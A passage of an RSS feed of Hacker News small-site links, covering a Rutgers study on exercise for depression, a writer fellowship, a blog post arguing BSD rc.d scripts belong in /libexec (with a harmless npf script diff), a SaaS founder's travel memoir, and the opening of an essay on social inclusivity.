href="https://t.umblr.com/redirect?z=https%3A%2F%2Fkines.rutgers.edu%2Fdepartmental-info%2Ffaculty-biographies%2F262-faculty%2F789-brandon-alderman&amp;t=OTg0NmFhZjYzOTc4NzA5ZGM4MDEzYmU2NDNjY2U3MzJiNjY0Mjc4Ziw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">Brandon L. Alderman</a>, an associate professor in the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fkines.rutgers.edu%2F&amp;t=ZmFjODU3YmNlNDVhOGEzYTcyNDRjM2ExNGY3NzZjZjlmYjQ3ZGEzOSw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">Department of Kinesiology and Health</a> in the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fsas.rutgers.edu%2F&amp;t=YThkYjIzZGEzOTNkNzU5MjMzYTdkYjIyZDhlZGVkYmM3MDZlNzk1ZCw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">School of Arts and Sciences</a> at <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnewbrunswick.rutgers.edu%2F&amp;t=MWI1YThkNTQzOGRkN2Y2NmIwYzYzYWY0NTJiMjA1MzY4OWY3YmM1Niw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">Rutgers University–New Brunswick</a>. “We also need to know whether exercise has a similar antidepressant effect in younger adolescents and in adults with more treatment-resistant forms of depression who have not responded well to traditional treatments, including antidepressants and cognitive behavioral therapy.”</p><p>Unique to this precision medicine study, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1017%2FS0033291720002573&amp;t=OGFiMTIwZTJmN2EwMTJiNzY5YjhkYmQwNzJlNTRhZGI4NzE1MTAxOSw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">published in the journal <i>Psychological Medicine</i></a>, is an assessment of cognitive control and reward-related brain activity, two facets of brain function that are impaired in people with depression. Like previous studies, this one showed that aerobic exercise helps young adults with major depression.</p><p>Cognitive control means processes that allow adjustments in behavior to help achieve goals and resist distractions. Reward processing (or reward-related brain activity) reflects the response to rewarding stimuli or outcomes and the ability to process and then modulate your response to positive and negative outcomes, such as loss. Deficits in reward processing have been linked to multiple psychiatric conditions, including major depression, and may reflect anhedonia – the loss of interest in or inability to experience pleasure in cases of depression.</p><p>Many people with major depression, a complex disease, do not respond favorably to evidence-based treatments. Depression symptoms include feelings of hopelessness, irritability, fatigue, difficulty concentrating and thoughts of suicide, according to the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nimh.nih.gov%2Fhealth%2Ftopics%2Fdepression%2Findex.shtml&amp;t=NzE5ZDdkMjgzMmRlNmNjNjY0Mjg1ZmVmM2E4ZGUzMGNjNmZhNjI1Yiw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">National Institute of Mental Health</a>. People suffering from depression often seek effective treatment using a trial-and-error approach. They move in and out of various treatments, including antidepressants and cognitive behavioral therapies, according to Alderman.</p></div><div><p>The Rutgers-led team studied 66 young adults with major depression, focusing on aerobic exercise and its impact on depressive symptoms. Three times a week for eight weeks, some participants did moderate-intensity aerobic exercise and others did light-intensity stretching. Depression symptoms were reduced by 55 percent in the aerobic exercise group versus 31 percent in the light-intensity stretching group.</p><p>While aerobic exercise did not influence reward processing or cognitive control, people with better reward processing when the study began were more likely to successfully respond to exercise treatment.</p></div><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.rutgers.edu%2Fnews%2Fwho-could-benefit-exercise-and-behavioral-treatment&amp;t=NGQxMzBjMGM3MzkzZDY0MWUxMzRkM2VkYWJhMjMyNTRiYTA2N2QyNyw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">Rutgers University</a></b></p><p><b>Full study:</b>&nbsp;

<i>Psychological Medicine</i> (2020). <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.1017%2FS0033291720002573&amp;t=OWJiMDM4ODMxMzRhYmE3N2E2NjJlMzYyOTJlOTQ3ZWMzMzAxZGRlYSw3R2NhblF4bQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627358358489513985%2Fdepression-predicting-the-benefits-of-exercise&amp;m=0&amp;ts=1598559743">DOI: 10.1017/S0033291720002573</a></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/619304978155290624/predicting-loneliness">Predicting loneliness across various groups</a></p><p><a href="https://nuadox.com/post/623746641320624128/link-between-dementia-and-apathy">New study: Apathy not depression helps to predict dementia</a></p><p><a href="https://nuadox.com/post/164757359157/ai-vr-mental-disorders">AI and VR could transform how we diagnose and treat mental disorders</a></p><p><a href="https://nuadox.com/post/172345201212/ai-suicide-prevention-canada">How AI is helping to predict and prevent suicides</a></p><p><a href="https://nuadox.com/post/173146444932/trayt">Trayt’s new app: Helping patients with neurodevelopmental disorders track symptoms</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/exercise">exercise</a>
                                    
                                        <a href="https://nuadox.com/tagged/depression">depression</a>
                                    
                                        <a href="https://nuadox.com/tagged/aerobic">aerobic</a>
                                    
                                        <a href="https://nuadox.com/tagged/mental-health">mental health</a>
                                    
                                        <a href="https://nuadox.com/tagged/precision-medicine">precision medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/627358358489513985/depression-predicting-the-benefits-of-exercise</link>
            <guid isPermaLink="false">hacker-news-small-sites-24264161</guid>
            <pubDate>Mon, 24 Aug 2020 19:03:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Deck Writer Fellowship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24264111">thread link</a>) | @simonpure
<br/>
August 24, 2020 | https://www.beondeck.com/writers | <a href="https://web.archive.org/web/*/https://www.beondeck.com/writers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The On Deck Writer Fellowship (ODW) is an eight-week program inspired by the success of the On Deck Fellowship.<br>‍<br>Bloggers, essayists, and newsletter writers are micro-entrepreneurs: beyond just producing great writing, they have to find their niche, market to readers, and figure out how to grow towards their goals, whether generating revenue, building an audience, or just honing their craft. The experience of establishing a regular writing cadence and cultivating an audience is strengthened by regular support &amp; accountability.</p><p>ODW will help groups of 150 writers find their way towards having a successful writing practice, and connect them with a lifelong community of creative, collaborative peers. ODW will help specifically with editing, distribution, and accountability.</p></div></div>]]>
            </description>
            <link>https://www.beondeck.com/writers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24264111</guid>
            <pubDate>Mon, 24 Aug 2020 18:58:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RC.d Belongs in Libexec, Not etc.]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24263810">thread link</a>) | @dddddaviddddd
<br/>
August 24, 2020 | https://jmmv.dev/2020/08/rcd-libexec-etc.html | <a href="https://web.archive.org/web/*/https://jmmv.dev/2020/08/rcd-libexec-etc.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              
              <article>

<p>Let’s open with the controversy: the scripts that live under <code>/etc/rc.d/</code> in FreeBSD, NetBSD, and OpenBSD are in the wrong place. They all should live in <code>/libexec/rc.d/</code> because they are code, <em>not</em> configuration.</p>

<p>This misplacement is something that has bugged me for ages but I never had the energy to open this can of worms back when I was very involved in NetBSD. I suspect it would have been a draining discussion and a very difficult thing to change.</p>

<p>But… what am I talking about anyway?</p>

<p>If you have administered a BSD system, you have certainly encountered the <code>/etc/rc.d/</code> directory; and if you have administered pre-systemd Linux systems, you have dealt with <code>/etc/init.d/</code>. These directories contain startup scripts to configure the system at boot time and are immutable. Their code is parameterized to allow changing their behavior via configuration files, not via code edits. And that’s the base of my critique.</p>

<p>But before getting into why the current state is problematic and how things should look like, let’s first dig into how we got here. And, for that, we need to go back in history.</p>



<p>4.4BSD’s (1993) boot process was rather simple: the kernel started <code>init</code> which in turn ran the <code>/etc/rc</code> script before starting <code>getty</code> on each console. The <code>/etc/rc</code> monolith was in charge of configuring the machine’s file systems and processes, and delegated to two other scripts: <code>/etc/netstart</code> for network configuration and <code>/etc/rc.local</code> for locally-added services. Current BSD systems are more advanced in this area as we shall see later, but the core boot process remains the same: <code>/etc/rc</code> is the primary entry point and bootstraps a collection of shell scripts.</p>

<p>In the early days, package management and file provenance tracking, like we are used to having in popular Linux distributions, was not a thing. You were expected to tune the systems’ behavior by <em>editing</em> files which might or might not have been designed to support edits. If you had to edit <code>/etc/rc</code>, which was a script shipped by the system, that was alright.</p>

<p><code>/etc/rc.local</code>, on the other hard, was <em>not</em> shipped by the system, and it was up to you to create it if you wanted to add custom startup commands without modifying <code>/etc/rc</code>. And this is where things get interesting. <code>/etc/rc.local</code> didn’t need to be supported: if you were expected and able to edit <code>/etc/rc</code> anyway, why would you deal with a separate file? The reason is, most likely, to simplify system upgrades: during an upgrade, you want to benefit from any upstream changes made to <code>/etc/rc</code> (some of which might actually be <em>necessary</em> for proper system operation). Applying updates to a manually-modified file is tricky, so putting as many of your manual overrides into <code>/etc/rc.local</code> helped minimize this problem.</p>



<p>System V 4 (SVR4, 1988) also came with its own, and very different, boot process. The key difference was that System V had the concept of runlevels. As a result, configuring the boot process was a more convoluted endeavour because it was possible to select different services per runlevel.</p>

<p>To accomplish per-runlevel tuning, the system used <a href="https://jmmv.dev/2020/08/config-files-vs-directories.html">configuration directories rather than files</a>: there was a separate <code>/etc/rcX.d/</code> directory for each runlevel (where <code>X</code> was the number of the runlevel), and these directories contained one file per action to take at startup time. To avoid duplicates, these files were just symlinks to common files under <code>/etc/init.d/</code>—and the symlinks, not their targets, were named so that their lexicographical order determined startup execution order.</p>

<p>Once again, we can already observe issues here: the symlinks under <code>/etc/rcX.d/</code> <em>are</em> configuration because their presence indicates what to start and their names determine their startup order. But the files under <code>/etc/init.d/</code> are <em>not</em>: they are shell scripts shipped with the system and should not be manually modified.</p>



<p>NetBSD <a href="http://www.mewburn.net/luke/papers/rc.d.pdf">modernized the boot process</a> in its 1.5 release (2000), and it did so in two ways: first, it introduced <code>/etc/rc.d/</code> as a directory to contain separate scripts per action and service; and, second, it introduced <a href="https://netbsd.gw.com/cgi-bin/man-cgi?rcorder+8+NetBSD-9.0-STABLE">the <code>rcorder(8)</code> tool</a> to determine the order in which these services run. <code>rcorder(8)</code> uses dependency information encoded in the scripts as comments—not lexicographical ordering as System V did. FreeBSD <a href="https://www.freebsd.org/cgi/man.cgi?query=rc&amp;apropos=0&amp;sektion=8&amp;manpath=FreeBSD+12.1-RELEASE&amp;arch=default&amp;format=html">inherited this design</a> in its 5.0 release (2003) and OpenBSD reimplemented something similar in its 4.9 release (2011).</p>

<p>With these two pieces in place, the <code>/etc/rc</code> script in NetBSD and FreeBSD changed to execute all files from <code>/etc/rc.d/</code> based on the output of <code>rcorder(8)</code>. Among these scripts is <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc.d/local"><code>/etc/rc.d/local</code></a>, whose purpose is to run <code>/etc/rc.local</code> if it exists. And that’s all, really. The <code>/etc/rc</code> script thus became <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc">trivial</a>.</p>

<p>The key thing to notice here is that the scripts shipped in <code>/etc/rc.d/</code> are <em>highly configurable</em> via the user-controlled <a href="https://github.com/NetBSD/src/blob/8f8c6d6b2a8778b653d9630f3f18e057b477a012/etc/rc.conf"><code>/etc/rc.conf</code></a> file. This essentially makes the scripts read-only, as it shifts local customizations to the configuration file. <em>System administrators are not supposed to edit the scripts.</em> Instead, they are supposed to: modify <code>/etc/rc.conf</code> to customize what gets run and how; add new scripts under <code>/etc/rc.d/</code> if they so choose; and edit <code>/etc/rc.local</code> to easily run arbitrary commands.</p>



<p>My main gripe is that the files under <code>/etc/rc.d/</code> are immutable scripts. They do not belong in <code>/etc/</code> and their presence there makes system upgrades harder for no good reason.</p>

<p>You see: in NetBSD and FreeBSD, system upgrades happen by unpacking new distribution sets in the root directory and then running a script to incorporate configuration updates. This script is interactive and helps highlight how new system-provided updates to configuration files conflict with previous manual edits. (This process might seem rudimentary to you, but it’s actually pretty robust and easy to understand—and you can use tooling like <a href="https://github.com/jmmv/sysupgrade/">sysupgrade</a> to make it trivial.)</p>

<p>So why is that a problem? Because you will <em>always</em> face merges like this:</p>
<div><pre><code data-lang="diff"><span>--- /etc/rc.d/npf               2019-08-09 19:09:42.800758233 -0400
</span><span></span><span>+++ /tmp/temproot/etc/rc.d/npf  2019-11-16 10:39:27.000000000 -0500
</span><span></span><span>@@ -1,6 +1,6 @@
</span><span></span> #!/bin/sh
 #
<span>-# $NetBSD: npf,v 1.3 2012/11/01 06:06:14 mrg Exp $
</span><span></span><span>+# $NetBSD: npf,v 1.4 2019/04/19 18:36:25 leot Exp $
</span><span></span> #
 # Public Domain.
 #
<span>@@ -36,7 +36,11 @@
</span><span></span>        echo "Enabling NPF."
        npf_cfg_check
        /sbin/npfctl reload
<span>-       /sbin/npfctl start
</span><span></span><span>+
</span><span>+       # The npf_boot script has enabled npf already.
</span><span>+       if [ "$autoboot" != "yes" ]; then
</span><span>+               /sbin/npfctl start
</span><span>+       fi
</span><span></span> }
 
 npf_stop()

File: /etc/rc.d/npf (modified)

Please select one of the following operations:

  d  Don't install the new file (keep your old file)
  i  Install the new file (overwrites your local modifications!)
  m  Merge the currently installed and new files
  s  Show the differences between the currently installed and new files
  su  Show differences in unified format ("diff -u")
  sc  Show differences in context format ("diff -c")
  ss  Show differences side by side ("sdiff -w187")
  scommand Show differences using the specified diff-like command
  v  Show the new file

What do you want to do? [Leave it for later]
</code></pre></div>
<p>And, really, who cares? Why are you being distracted to review a <em>code</em> change when what you are trying to do is assess <em>configuration</em> conflicts? How many times have you actually objected to these merges?</p>

<p>You might say: well, I want to know <em>exactly</em> how the boot process of my machine changes during an upgrade. Sure, that’s a fine goal, but then this procedure is flawed and completely insufficient to achieve such goal. In the example above, whatever <code>/etc/rc.d/npf</code> does can also be done from within the <code>/sbin/npfctl</code> binary it invokes… and you were never asked to review changes to the latter during an upgrade, were you? And <em>of course</em> you could review the binary’s code as part of your own system build, but if you did that, then you could have reviewed the startup script as well, right?</p>



<p>Startup scripts provided by the system need to live in a location that can contain executables—but we don’t want those executables to show up in the <code>PATH</code>. These requirements discard <code>bin</code> and <code>sbin</code>, and points us towards <code>libexec</code> on BSD systems and somewhere under <code>lib</code> on Linux.</p>

<p>Therefore, the read-only startup scripts should move from <code>/etc/rc.d/</code> to <code>/libexec/rc.d/</code> (which, by the way, also applies to <code>/etc/rc</code>, <code>/etc/rc.subr</code>, and <code>/etc/rc.shutdown</code>). And that’s it. <del><code>/etc/rc</code></del> <code>/libexec/rc</code> should continue to use <code>rcorder(8)</code> to check what’s needed to run, but it should read files from <code>/libexec/rc.d/</code>. You might even want to support a separate location for user-created services, which might still be <code>/etc/rc.d/</code> or, better yet, a more fitting location like <code>/usr/pkg/libexec/rc.d/</code> (though that quickly runs into problems if you have multiple file systems).</p>

<p>With this design, system upgrades would be much saner because the configuration merge process would focus, purely, on actual configuration changes and not on irrelevant code changes. All updates to <code>/libexec/rc.d/</code> would be applied by unpacking the new distribution sets (<code>base.txz</code> in this case) without disturbing you about how exactly they changed.</p>

<p>Does this relate to Linux distributions at all? I briefly mentioned <code>/etc/init.d/</code> at the beginning, and the problem there is similar. But it’s also an obsolete problem given that Linux distributions have moved onto systemd by now. That said, systemd still has to manage individual services and, like it or not, has gotten this right. If we look at the <a href="https://www.freedesktop.org/software/systemd/man/systemd.unit.html"><code>systemd.unit(5)</code></a> manual page, which describes where units are loaded from, the system first looks into various <code>/etc/</code> and <code>/run/</code> directories, but then also looks at <code>/usr/lib/systemd/system/</code> (a read-only location correctly controlled by the package manager)—and the vast majority of the scripts live inside the latter.</p>



<p>I currently don’t run BSD systems any more so my incentives to make this happen are low… but if this all makes sense and is something you’d like to pursue, by all means please do! I’m happy to help …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jmmv.dev/2020/08/rcd-libexec-etc.html">https://jmmv.dev/2020/08/rcd-libexec-etc.html</a></em></p>]]>
            </description>
            <link>https://jmmv.dev/2020/08/rcd-libexec-etc.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263810</guid>
            <pubDate>Mon, 24 Aug 2020 18:32:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I built a business that lets me live on the beach full time]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24263590">thread link</a>) | @ghiculescu
<br/>
August 24, 2020 | https://www.expatsoftware.com/Articles/guy-on-the-beach-with-a-laptop.html | <a href="https://web.archive.org/web/*/https://www.expatsoftware.com/Articles/guy-on-the-beach-with-a-laptop.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
	
<div>
	
	<p><a href="https://s3.amazonaws.com/img.expatsoftware.com/blog/kids-tonsai-boat.jpg">
<img src="https://s3.amazonaws.com/img.expatsoftware.com/blog/kids-tonsai-boat.jpg">
</a>
</p>
<p>
I take a lot of vacation.  I find it more enjoyable than working.
</p><p>
That's not to say that I don't like working.  I write software for a living, which is crazy fun in and of itself.  If you'd have told little 14 year old Jason, writing games on his Commodore 64, that he'd one day have a job doing basically the same thing, he'd have been pretty stoked.
</p><p>
But over the years I've found a lot of other stuff that I like doing even more than programming computers.  I like to climb rocks, surf and travel through interesting parts of the world, and always found it hard to do that for, say, most of the year every year when I had to work for other people.  So I set out to build a business with the heuristic of "Maximize Jason's Vacation Time". 
</p><p>
This is a rather long and drawn out account of how I did that (and how you can probably do that too.)
</p><h3>Stage One: Contracting</h3>
<p>
I sat in a lot of felt cubicles in the 90s, riding various venture-backed startups into the ground and generally having a lot of fun doing so.  Over time, I noticed the same story coming up again and again.  About "the Contractors who had charged $150k to build the prototype" and "the Contractors they brought in for $200/hr to build this other system".  The general tone was always sort of "That's unfair.  We could have saved the company a ton of money if we'd have done this ourselves."  But I came away with a different message:
</p><p>
I gotta figure out how to get into this "Contractor" thing.
</p><p>
So, as always happened in 1998, the company I was working for burned through its $5m over the course of a summer and laid everybody off just before hitting the ground.  I had been doing some cool stuff for these guys, so I got a call from the CTO asking if I was interested in sticking around for a few months to mothball the tech so the investors could possibly sell it onward.  
</p><p>
"I suppose", I said, "I could stick around on a Contract..."
</p><h3>Stage Two: Travelling Between Contracts</h3>
<p><a href="https://s3.amazonaws.com/img.expatsoftware.com/blog/oz-hooptie.jpg">
<img src="https://s3.amazonaws.com/img.expatsoftware.com/blog/oz-hooptie.jpg">
</a>
</p>
<p>
Now the cool thing about Contracting, in case it wasn't clear above, is that they pay you at least twice as much as everybody else to do the same job.  Yeah, you have to buy your own health insurance, and they can drop you with no notice whatsoever.  But it turns out that <i>any</i> job can and will drop you without notice.  And catastrophic health coverage is like $100/month for a healthy guy under 40.  The math kinda works out.
</p><p>
Being an Engineer, and thus knowing how to divide, I quickly worked out that a job paying "twice as much in a year" will also pay you "exactly as much in six months".  And hey what do you know, they have Contracts that last just 6 months.  And flights to Thailand for $800.
</p><p>
So I started taking time off between gigs.
</p><p>
I experimented a bit and found that if I moved to a high cost-of-living spot like Southern California to pick up those contract gigs, I could live cheaply and sock away even more of the higher rate those gigs would pay.  After all, while rooms in LA go for $900/month instead of $300/month in Portland, you can make up that difference with a single day's pay at $75/hr.
</p><p>
And since rooms on the beach in Thailand were going for $5/day back then, it'd only take a few months of Contracting to pay for an entire year on the road in places like Southeast Asia and Africa, including occasional flights and beer money.  I got pretty good at rock climbing.
</p><p>
As it worked out, though, I never made it a whole year on the road.  I missed thinking. As fun and rewarding as it is to travel the world, the intellectual challenges you face trying to work out bus routes in a language you don't understand can never compare to the ones you face writing code.  I'd end up emailing my contacts back home somewhere around the 6-9 month mark, and would eventually hop a flight back to LA to work another gig.
</p><h3>Stage Three: Travelling While Contracting</h3>
<p><a href="https://s3.amazonaws.com/img.expatsoftware.com/blog/dream-valley-office.jpg">
<img src="https://s3.amazonaws.com/img.expatsoftware.com/blog/dream-valley-office.jpg">
</a>
</p>
<p>That was all way back in the early 00's.  Even then it was apparent that this whole Internet thing was kinda taking off.  While the concept of "guy on a beach with a laptop" was still mostly just a <a href="https://www.youtube.com/watch?v=2kfIFDX9kE4&amp;list=PLFjuhgb3UjqZFZQ6SwcBE98_qNSKyF1AV">cheesy AT&amp;T ad</a>, it was starting to seem like it might not actually be that far off.  I had some freelance clients in other cities.  Some of them I'd never met in person.  I was already working remotely.  Why not see how remote I could go?
</p><p>
So I picked a client.  Or rather, a client picked himself by dragging out a project when he knew I had already booked a flight.  And we tried having me build his thing out of my bungalow on Tonsai beach.
</p><p>
It kinda worked.  And it got my internal mathematician working again to determine that hey, I can afford to live here on this beach indefinitely if I can somehow arrange just one day of work per month.
</p><p>
That's good.
</p><h3>Stage Four: Software Product Business</h3>
<p><a href="https://s3.amazonaws.com/img.expatsoftware.com/blog/arusi-laptop-2.jpg">
<img src="https://s3.amazonaws.com/img.expatsoftware.com/blog/arusi-laptop-2.jpg">
</a>
</p>
<p>The only downside of all this is that it still required quite a bit of working for Other People.  Other People often have silly ideas about what needs working on, and the work is sometimes not as much fun as you could hope.  But try as I might, I couldn't find a solution.  The problem was, every time I stopped working for Other People, they stopped sending me money.  Something had to give.
</p><p>
I started working on building a Software Product in my spare time (which, helpfully, I still had a lot of).  But boy, did I suck at it.  There are a lot of really good resources online these days to steer a fella clear of all the obvious pitfalls I stumbled across in places like picking product ideas, gauging interest, finding customers, etc.,  So now I do a lot of nodding along to articles with tons of common sense advice that anybody with half a brain could have figured out, but that had never occurred to me when I designed and built my first several products.
</p><p>
But I stuck with it and eventually came up with <a href="https://www.twiddla.com/">Twiddla</a> (which lots of people really like) and <a href="https://www.s3stat.com/">S3stat</a> (which people are actually willing to pay for).  The second one pays to keep the first alive, which is handy because that one is a lot more impressive to show off in case I ever need to find another one o' those contract gigs in the future.
</p><p>
And the cool thing with Software as a Service (SaaS) products is that people keep sending you money every month whether you're working or not.  QED.
</p><p>
It's still hard though.  When you first build one of these "earn money in your sleep" SaaS products, it really doesn't make you all that much money. After a few months of being launched and signing customers, S3stat was still only bringing in something like $50/month.
</p><p>
It was tough to keep motivated to tweak, market, A/B Test and otherwise keep moving forward with this product stuff, especially looking at the old consulting rate and comparing it to the effective hourly rate from this f'ng side project.
</p><p>
But here's the thing.  After a while, that $50/month started to look more like $500.  Still nothing compared to consulting, but it paid me that $500 while I was off surfing in Morocco for the whole month.  And the next year it paid me $1,000/month while I was backpacking through South America and building another (sadly failed) product on the laptop.  It even kept sending me money at the same time I was doing consulting gigs for other companies.
</p><p>
Notice that it kept growing even when neglected.  That's another advantage of SaaS.  Until attrition really kicks in, you're going to be signing more customers than you lose.  Even if you only sign a few per month, that's revenue that just keeps piling on top of itself.
</p><h3>Stage Five: Chillin'</h3>
<p><a href="https://s3.amazonaws.com/img.expatsoftware.com/blog/boat-2.jpg">
<img src="https://s3.amazonaws.com/img.expatsoftware.com/blog/boat-2.jpg">
</a>
</p>
<p>
Having a successful Single Player Software Empire does have one downside: Customers.
</p><p>
Having Customers can sometimes seem an awful lot like working for Other People.  Customers often have silly ideas about what features your product needs.  They send you emails asking to reset their password, and they don't appreciate it if your thing stops working for an entire week while you're taking a riverboat up the Amazon.
</p><p>
I'm lucky that S3stat has a pretty technical audience that doesn't generally need a lot of hand holding, so support was never something that needed my full time attention.  Still, I'm an Engineer, so I like to automate everything that can be automated.  That doesn't just include simple things like those password reset emails.  It also means that whenever I get a support request, I make sure to Fix It Twice:  Once to fix the issue for the customer, and another time in the code, documentation or UI to make sure that I don't ever see another support request for it.  So as time goes on, there are fewer things that can interrupt my Days Off.  (Days Off being defined as days where the sun is out or the kids are off school and I don't need a rest day from climbing or surfing, so hey, let's polish the product a bit).
</p><p>
Naturally, I still get bored of Chillin' The Most, so it's handy to still be good at all this computer programming stuff.  I'm still cranking out new features for <a href="https://www.s3stat.com/">S3stat</a> and <a href="https://www.twiddla.com/">Twiddla</a>, and I have <a href="https://www.unwaffle.com/">Unwaffle</a> (the <a href="https://www.unwaffle.com/">SaaS Customer Lifecycle Metrics</a> thing I've been writing about lately) running in beta mode for a few test customers.  Lots of code is getting written, but finally it's all happening on my time.
</p><p>
Which Was What We Wanted. 
</p><h3>A footnote.</h3>
<p><a href="https://s3.amazonaws.com/img.expatsoftware.com/blog/parrot-keyboard-landscape.jpg">
<img src="https://s3.amazonaws.com/img.expatsoftware.com/blog/parrot-keyboard-landscape.jpg">
</a>
</p>
<blockquote>
I don't mean to brag. I don't mean to boast, but I'm intercontinental when I eat French Toast.

</blockquote>
<p>
I see articles like this come past on the Internet every once in awhile, and they are invariably received with hostility.  "Sampling Bias!"  "That guy could only do this because of $X!"  "That wouldn't work today in this economy!" "If all this stuff really worked, why tell us about it instead of milking it for millions. He's probably just trying to sell us his book!"  Lots of reasons why we should quickly dismiss everything that was said above and carry on the way we were before.
</p><p>
But a good plan instead might be to read those stories and see if there is an idea or two in there that might be applicable to other people.  Perhaps, even, to you yourself.
</p><p>
Personally, I don't find any of the above to be particularly …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.expatsoftware.com/Articles/guy-on-the-beach-with-a-laptop.html">https://www.expatsoftware.com/Articles/guy-on-the-beach-with-a-laptop.html</a></em></p>]]>
            </description>
            <link>https://www.expatsoftware.com/Articles/guy-on-the-beach-with-a-laptop.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263590</guid>
            <pubDate>Mon, 24 Aug 2020 18:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Can Sit with Us]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24263536">thread link</a>) | @jonathanliu
<br/>
August 24, 2020 | https://jonathanliu.me/you-can-sit-with-us/ | <a href="https://web.archive.org/web/*/https://jonathanliu.me/you-can-sit-with-us/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1694">

				
		
		
	
		
		<div>
				
<p>In the 2004 cult classic <em>Mean Girls</em>, erstwhile queen bee Regina George is banished from the group’s lunch table after she violates their dress code:</p>



<blockquote><p><strong>Gretchen</strong>: Regina, you’re wearing sweatpants. It’s Monday.<br><strong>Regina</strong>: So…?<br><strong>Karen</strong>: So that’s against the rules, and you can’t sit with us.</p></blockquote>



<p>Like most high schools, the fictional North Shore had numerous cliques. A group of girls sat at the top of the pecking order. Known as the Plastics, the girls maintained their high social status through militant exclusivity.</p>



<p>Conversely, I posit that high status individuals are generally <strong>better off being inclusive</strong>. Not in a moralistic “it would be mean to exclude people” sense, but because it has positive expected value for everyone involved.</p>



<p>By being inclusive, I don’t mean letting everyone have unfettered access to you. You can include people simply by inviting them into your community or sharing your microphone with them, like a famous comedian might do for newcomers.</p>







<h4>Weak Ties</h4>



<p>If you habitually exclude people, you are depriving yourself of weak ties. Popularized by Stanford sociology professor Mark Granovetter in 1973, weak ties are defined as acquaintances or strangers with a common cultural background (e.g. shared alma mater). Although you wouldn’t call one up at midnight to help bury a body, weak ties are the best source of new jobs, business opportunities, ideas, and even romantic relationships. </p>



<p>Weak ties are positively asymmetrical – they have high upside and low downside. Think of them like lottery tickets. The more, the merrier.</p>



<p>Derek Sivers is the best example of this. Over the past eleven years, he’s answered around 85,000 emails from 65,000 people. At the beginning of the pandemic, <a href="https://sive.rs/2020-04-email" target="_blank" rel="noreferrer noopener nofollow">he asked his entire mailing list how they were doing</a>. 7,000 people replied, and he responded to them all. Doing so has resulted in a global network of friends, four romances, and (I can only imagine) countless new ideas.</p>



<h4>Social Emergence</h4>



<p>As you allow people to join your group, they begin to form connections with each other. Interconnection not only benefits both parties, but also the group as a whole. You benefit from being a high status member of it.</p>



